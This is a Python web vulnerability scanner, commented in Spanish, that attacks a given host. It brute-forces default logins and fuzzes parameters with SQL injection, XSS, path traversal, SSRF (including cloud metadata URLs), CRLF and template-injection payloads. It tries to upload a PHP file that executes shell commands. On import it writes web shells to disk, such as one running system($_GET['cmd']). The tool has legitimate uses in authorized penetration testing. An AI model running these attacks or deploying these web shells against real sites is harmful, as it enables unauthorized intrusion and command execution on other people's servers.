import requests
import os
import socket
import random
import time

def save_results_to_file(results, commands, filename="vulnerabilities_report.txt"):
    """Guarda los resultados del escaneo en un archivo."""
    with open(filename, "w") as f:
        f.write("Resultados de la Herramienta de Vulnerabilidades\n")
        f.write("=" * 50 + "\n")
        f.write(f"{'Vulnerabilidad':<25} {'Detalles':<25}\n")
        f.write("-" * 50 + "\n")
        for result in results:
            f.write(f"{result['name']:<25} {result['details']:<25}\n")
        f.write("\nComandos Utilizados:\n")
        f.write("=" * 50 + "\n")
        for command in commands:
            f.write(f"{command}\n")
    print(f"[INFO] Resultados guardados en {filename}")

def check_security_headers(target):
    """Verifica la presencia de encabezados de seguridad en el objetivo."""
    print(f"\n[INFO] Verificando encabezados de seguridad en: {target}")
    headers_to_check = [
        "Content-Security-Policy",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "Strict-Transport-Security",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Permissions-Policy",
        "Expect-CT",
        "Cross-Origin-Embedder-Policy"
    ]
    vulnerabilities = []

    try:
        response = requests.get(f"http://{target}", timeout=5)
        headers = response.headers
        for header in headers_to_check:
            if header not in headers:
                vulnerabilities.append({"name": "Falta encabezado", "details": header})
    except Exception as e:
        print(f"[ERROR] Error al verificar encabezados: {e}")
    return vulnerabilities

def scan_ports(target, ports=[21,22,23,25,53,80,110,143,443,445,3306,3389,8080,8443]):
    """Escanea puertos comunes en el objetivo."""
    print(f"[INFO] Escaneando puertos en {target}...")
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception:
            continue
    return [{"name": "Puerto abierto", "details": f"Puerto {p} abierto"} for p in open_ports]

def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "curl/7.68.0",
        "sqlmap/1.5.2#stable"
    ]
    return random.choice(agents)

def advanced_request(url, method="GET", data=None, headers=None, proxies=None):
    if headers is None:
        headers = {}
    headers["User-Agent"] = random_user_agent()
    try:
        if method == "POST":
            return requests.post(url, data=data, headers=headers, proxies=proxies, timeout=7, allow_redirects=True)
        else:
            return requests.get(url, headers=headers, proxies=proxies, timeout=7, allow_redirects=True)
    except Exception as e:
        return None

def detect_waf(target):
    waf_signatures = ["cloudflare", "sucuri", "incapsula", "akamai", "barracuda", "f5", "mod_security"]
    try:
        resp = requests.get(f"http://{target}", timeout=5)
        headers = str(resp.headers).lower()
        for sig in waf_signatures:
            if sig in headers or sig in resp.text.lower():
                return [{"name": "WAF Detectado", "details": sig}]
    except Exception:
        pass
    return []

def enumerate_dirs_files(target):
    wordlist = ["admin", "login", "dashboard", "config", "backup", "uploads", "api", ".git", ".env", "phpinfo.php", "test", "dev", "staging"]
    found = []
    for w in wordlist:
        url = f"http://{target}/{w}"
        try:
            resp = requests.get(url, timeout=4)
            if resp.status_code in [200, 401, 403] and len(resp.text) > 10:
                found.append({"name": "Directorio/Archivo encontrado", "details": url})
        except Exception:
            continue
    return found

def fuzz_parameters(target):
    payloads = [
        "' OR 1=1--", "<script>alert(1337)</script>", "../../etc/passwd", "file:///etc/passwd",
        "http://127.0.0.1", "127.0.0.1:80", "admin'--", "test@example.com", "1; DROP TABLE users--",
        "Set-Cookie: evil=1", "Host: evil.com", "%0a%0dInjected-Header: injected"
    ]
    params = ["id", "q", "search", "file", "page", "url", "redirect", "name", "email"]
    vulns = []
    for param in params:
        for payload in payloads:
            url = f"http://{target}/?{param}={payload}"
            resp = advanced_request(url)
            if resp and (payload in resp.text or "root:x:" in resp.text or "syntax" in resp.text.lower()):
                vulns.append({"name": "Fuzzing parámetro vulnerable", "details": f"{param}={payload}"})
    return vulns

def brute_force_login(target):
    # Solo ejemplo básico, buscar /login o /admin
    paths = ["/login", "/admin"]
    creds = [("admin", "admin"), ("admin", "password"), ("root", "root"), ("test", "test123")]
    found = []
    for path in paths:
        url = f"http://{target}{path}"
        for user, pwd in creds:
            data = {"username": user, "password": pwd}
            resp = advanced_request(url, method="POST", data=data)
            if resp and ("dashboard" in resp.text.lower() or "logout" in resp.text.lower()):
                found.append({"name": "Login débil", "details": f"{url} ({user}:{pwd})"})
    return found

def ssrf_test(target):
    urls = [
        f"http://{target}/?url=http://127.0.0.1",
        f"http://{target}/?next=http://169.254.169.254/latest/meta-data/",
        f"http://{target}/?site=file:///etc/passwd"
    ]
    vulns = []
    for url in urls:
        resp = advanced_request(url)
        if resp and ("root:x:" in resp.text or "meta-data" in resp.text):
            vulns.append({"name": "Posible SSRF", "details": url})
    return vulns

def crlf_injection(target):
    urls = [
        f"http://{target}/?header=Injected%0d%0aSet-Cookie:%20crlf=1",
        f"http://{target}/?q=%0d%0aContent-Length:%200"
    ]
    vulns = []
    for url in urls:
        resp = advanced_request(url)
        if resp and ("Set-Cookie: crlf=1" in str(resp.headers) or "crlf" in resp.text):
            vulns.append({"name": "CRLF Injection", "details": url})
    return vulns

def host_header_injection(target):
    url = f"http://{target}/"
    headers = {"Host": "evil.com"}
    resp = advanced_request(url, headers=headers)
    if resp and ("evil.com" in resp.text or "evil.com" in str(resp.headers)):
        return [{"name": "Host Header Injection", "details": url}]
    return []

def scan_api_endpoints(target):
    endpoints = ["api", "api/v1", "graphql", "rest", "wp-json", "admin/api"]
    found = []
    for ep in endpoints:
        url = f"http://{target}/{ep}"
        resp = advanced_request(url)
        if resp and resp.status_code == 200 and len(resp.text) > 10:
            found.append({"name": "API endpoint encontrado", "details": url})
    return found

def upload_malicious_files(target):
    # Solo prueba si existe /upload
    url = f"http://{target}/upload"
    files = {'file': ('malicious.php', '<?php echo shell_exec("id"); ?>')}
    try:
        resp = requests.post(url, files=files, timeout=7)
        if resp.status_code in [200,201] and ("php" in resp.text or "id=" in resp.text):
            return [{"name": "Upload vulnerable", "details": url}]
    except Exception:
        pass
    return []

def fingerprint_technologies(target):
    """Detecta tecnologías básicas por headers."""
    techs = []
    try:
        response = requests.get(f"http://{target}", timeout=5)
        server = response.headers.get("Server")
        powered = response.headers.get("X-Powered-By")
        cookies = response.headers.get("Set-Cookie", "")
        if server:
            techs.append({"name": "Tecnología detectada", "details": f"Server: {server}"})
        if powered:
            techs.append({"name": "Tecnología detectada", "details": f"X-Powered-By: {powered}"})
        if "wordpress" in response.text.lower():
            techs.append({"name": "WordPress detectado", "details": "Contenido HTML"})
        if "laravel_session" in cookies:
            techs.append({"name": "Laravel detectado", "details": "Cookie"})
        if "PHPSESSID" in cookies:
            techs.append({"name": "PHP detectado", "details": "Cookie"})
    except Exception:
        pass
    return techs

def generic_vulnerability_scan(target):
    """
    Realiza un escaneo genérico de vulnerabilidades en el objetivo.
    Verifica la presencia de encabezados de seguridad y realiza otras comprobaciones básicas.
    """
    print(f"[INFO] Iniciando escaneo de vulnerabilidades en {target}...")

    vulnerabilities = []
    
    # Verificación de encabezados de seguridad
    vulnerabilities.extend(check_security_headers(target))
    vulnerabilities.extend(detect_waf(target))
    vulnerabilities.extend(fingerprint_technologies(target))
    vulnerabilities.extend(enumerate_dirs_files(target))
    vulnerabilities.extend(scan_api_endpoints(target))
    vulnerabilities.extend(fuzz_parameters(target))
    vulnerabilities.extend(brute_force_login(target))
    vulnerabilities.extend(ssrf_test(target))
    vulnerabilities.extend(crlf_injection(target))
    vulnerabilities.extend(host_header_injection(target))
    vulnerabilities.extend(upload_malicious_files(target))

    # Mejor detección XSS con más vectores
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "'\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
    ]
    for payload in xss_payloads:
        xss_check_url = f"http://{target}/?q={payload}"
        try:
            xss_response = requests.get(xss_check_url, timeout=5)
            if payload in xss_response.text:
                vulnerabilities.append({"name": "Posible Vulnerabilidad XSS", "details": f"Refleja payload: {payload}"})
        except Exception as e:
            print(f"[ERROR] Error al verificar XSS: {e}")

    # SQLi con más vectores
    sqli_payloads = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "';--",
        "\";--"
    ]
    for payload in sqli_payloads:
        sql_injection_test_url = f"http://{target}/?id={payload}"
        try:
            response = requests.get(sql_injection_test_url, timeout=5)
            if any(err in response.text.lower() for err in ["sql", "syntax", "mysql", "error", "warning"]):
                vulnerabilities.append({"name": "Posible Vulnerabilidad SQL Injection", "details": f"Payload: {payload}"})
        except Exception as e:
            print(f"[ERROR] Error al verificar SQL Injection: {e}")

    # LFI/RFI
    lfi_payloads = [
        "../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
    for payload in lfi_payloads:
        lfi_url = f"http://{target}/?file={payload}"
        try:
            lfi_response = requests.get(lfi_url, timeout=5)
            if "root:x:" in lfi_response.text or "[extensions]" in lfi_response.text:
                vulnerabilities.append({"name": "Posible LFI/RFI", "details": f"Payload: {payload}"})
        except Exception as e:
            print(f"[ERROR] Error al verificar LFI/RFI: {e}")

    # SSTI
    ssti_payloads = [
        "{{7*7}}",
        "${7*7}"
    ]
    for payload in ssti_payloads:
        ssti_url = f"http://{target}/?name={payload}"
        try:
            ssti_response = requests.get(ssti_url, timeout=5)
            if "49" in ssti_response.text:
                vulnerabilities.append({"name": "Posible SSTI", "details": f"Payload: {payload}"})
        except Exception as e:
            print(f"[ERROR] Error al verificar SSTI: {e}")

    # Directory Traversal
    traversal_payloads = [
        "../" * 6 + "etc/passwd",
        "..\\..\\" * 6 + "windows\\win.ini"
    ]
    for payload in traversal_payloads:
        traversal_url = f"http://{target}/?page={payload}"
        try:
            traversal_response = requests.get(traversal_url, timeout=5)
            if "root:x:" in traversal_response.text or "[extensions]" in traversal_response.text:
                vulnerabilities.append({"name": "Directory Traversal", "details": f"Payload: {payload}"})
        except Exception as e:
            print(f"[ERROR] Error al verificar Directory Traversal: {e}")

    return vulnerabilities

def check_for_ssl(target):
    """Verifica si el objetivo tiene un certificado SSL válido."""
    try:
        response = requests.get(f"https://{target}", timeout=5)
        if response.status_code == 200:
            return [{"name": "SSL Válido", "details": f"El sitio usa HTTPS."}]
        else:
            return [{"name": "Problema con SSL", "details": f"El sitio no responde correctamente a HTTPS."}]
    except requests.exceptions.SSLError:
        return [{"name": "Error SSL", "details": "El certificado SSL es inválido."}]
    except Exception as e:
        print(f"[ERROR] Error al verificar SSL: {e}")
        return []

def scan_for_common_vulnerabilities(target):
    """Realiza un escaneo para vulnerabilidades comunes adicionales."""
    common_vulns = []
    
    # Ejemplo: Comprobación para Open Redirect
    open_redirect_test_url = f"http://{target}/redirect?url=http://malicious.com"
    
    try:
        response = requests.get(open_redirect_test_url, timeout=5)
        if response.url != open_redirect_test_url:  # Si redirige a otra URL
            common_vulns.append({"name": "Posible Vulnerabilidad Open Redirect", "details": "El sitio redirige a URLs externas."})
        
    except Exception as e:
        print(f"[ERROR] Error al verificar Open Redirect: {e}")

    # Añadir detección de backup files
    backup_files = ["index.php~", "index.php.bak", "backup.zip", ".env", "config.php.save"]
    for bf in backup_files:
        url = f"http://{target}/{bf}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200 and len(resp.text) > 10:
                common_vulns.append({"name": "Archivo de backup expuesto", "details": bf})
        except Exception as e:
            print(f"[ERROR] Error al verificar backup file: {e}")
    return common_vulns

def prepare_malicious_files():
    """Crea archivos maliciosos necesarios para las pruebas."""
    malicious_files_content = {
        'malicious.jpg.php': '<?php echo shell_exec("ls"); ?>',
        'malicious.php': '<?php phpinfo(); ?>',
        'malicious.exe': b'\x4d\x5a\x90\x00',  # Header for a simple executable file
        'malicious.pdf': b'%PDF-1.4\n%PDF\n1 0 obj\n<< /Title (Malicious PDF) >>\nendobj\n',
        'malicious.zip': b'PK\x03\x04',  # Header for a simple zip file
        'malicious.gif': b'GIF89a',  # Header for a simple GIF file
        'malicious.jsp': '<% out.println("Hello World"); %>',
        'malicious.svg': '<svg><script>alert(1)</script></svg>',
        'malicious.txt': 'This is a test file.',
        'malicious.php3': '<?php echo $_GET["cmd"]; ?>',
        'malicious.phtml': '<?php echo system($_GET["cmd"]); ?>',
        'malicious.py': '#!/usr/bin/env python3\nprint("Hello World")',
        'malicious.asp': '<% Response.Write("Hello ASP") %>',
        'malicious.aspx': '<%@ Page Language="C#" %><script runat="server">Response.Write("Hello ASPX");</script>',
        'malicious.html': '<html><body><h1>Malicious HTML</h1></body></html>',
        'malicious.js': 'alert("Malicious JS");',
        'malicious.sh': '#!/bin/bash\necho "Malicious Shell"'
    }

    for filename, content in malicious_files_content.items():
        # Escribir como binario si es bytes, como texto si es str
        if isinstance(content, bytes):
            with open(filename, 'wb') as f:
                f.write(content)
        else:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(content)

# Llamar a prepare_malicious_files() para crear los archivos maliciosos necesarios antes de ejecutar los escaneos.
prepare_malicious_files()
